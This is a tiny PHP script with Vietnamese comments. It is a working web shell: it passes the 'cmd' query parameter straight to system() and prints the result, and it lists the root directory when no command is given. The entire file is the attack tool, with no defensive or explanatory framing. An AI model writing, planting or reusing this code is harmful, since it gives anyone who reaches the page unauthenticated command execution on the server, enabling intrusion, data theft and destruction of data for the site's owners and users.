<?php
// Đặt thẻ <pre> bên ngoài để định dạng mọi kết quả
echo "<pre>";

if (isset($_GET['cmd']) && !empty($_GET['cmd'])) {
    // Chỉ thực thi và in lệnh từ 'cmd'
    system($_GET['cmd']);
} else {
    // Nếu không có cmd, chạy lệnh mặc định
    system("ls -l /");
}

echo "</pre>";
?>